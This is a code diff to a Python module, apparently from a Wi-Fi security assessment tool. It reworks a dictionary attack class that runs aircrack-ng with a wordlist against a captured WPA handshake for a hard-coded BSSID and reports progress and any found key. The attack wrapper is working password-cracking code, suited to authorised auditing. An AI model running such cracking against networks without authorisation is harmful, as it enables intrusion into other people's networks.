@@ -1,7 +1,8 @@
 
-from Model.Attacks.AbstractAttack import AbstractAttack
+from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
 from Model.utils import target_dump
 import subprocess as sb
+import os.path
 
 class BruteForceAttack(AbstractAttack):
 
@@ -14,38 +15,46 @@ class BruteForceAttack(AbstractAttack):
         pass
 
 class DictionaryAttack(AbstractAttack):
-    __path_dict = 'Model/files/wordlist.txt' #TODO make default wordlist
+    __path_dict = 'Model/files/pass_dict' #TODO make default wordlist
 
     @classmethod
     def attack_name(cls) -> str:
         return 'Dictionary attack'
     
     @classmethod
-    def execute_attack(cls, target=None):
-        
+    def execute_attack(cls, q, kwargs):
         '''
         Attempts to crack the captured hash containing the password with a dictionary attack using the Aircrack tool 
         '''
-        target.bssid = 'E8:DE:27:B0:14:C9' #TODO
+        wordlist = cls.__path_dict
+        if os.path.exists('Model/files/wordlist.txt'):
+            wordlist = 'Model/files/wordlist.txt'
+
+        kwargs['target'].bssid = 'E8:DE:27:B0:14:C9' #TODO
         target_dump = 'Model/files/handshake' #TODO
-        cmd = ['sudo',
-            'aircrack-ng',
-            '-w', cls.__path_dict, #TODO create/upload dictionary file
-            '-b', target.bssid,
+        cmd = ['aircrack-ng',
+            '-w', wordlist, #TODO create/upload dictionary file
+            '-b', kwargs['target'].bssid,
             target_dump + "-01.cap"]
-        
-        result = sb.Popen(cmd, stdout=sb.PIPE, universal_newlines=True)
-        output = result.stdout.read()
 
-        if output.find('No valid WPA handshakes found') != -1:
-            yield 'No valid WPA handshakes found'
-        elif output.find('KEY FOUND') != -1:
-            yield 'KEY FOUND'
-        elif output.find('KEY NOT FOUND') != -1:
-            yield 'KEY NOT FOUND'
+        result = AttackResultInfo()
+        p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, text=True)
 
-        result.stdout.close()
-        return_code = result.wait()
+        for line in p.stdout:
+            perc = line.find('%')
+            key_found = line.find('KEY FOUND')
 
-        if return_code:
-            raise sb.CalledProcessError(return_code, cmd)
+            if perc != -1:
+                q.put('Current total passwords tested: ' + line[perc-6: perc+1] + "\n")
+
+            if key_found != -1:
+                q.put(line[key_found:]) 
+                result.risk = 'High'
+                result.desc = 'It was easy LOL'
+                result.attack = cls
+                q.put(result)
+
+            elif line.find('KEY NOT FOUND') != -1:
+                q.put('KEY NOT FOUND')
+
+        p.kill()
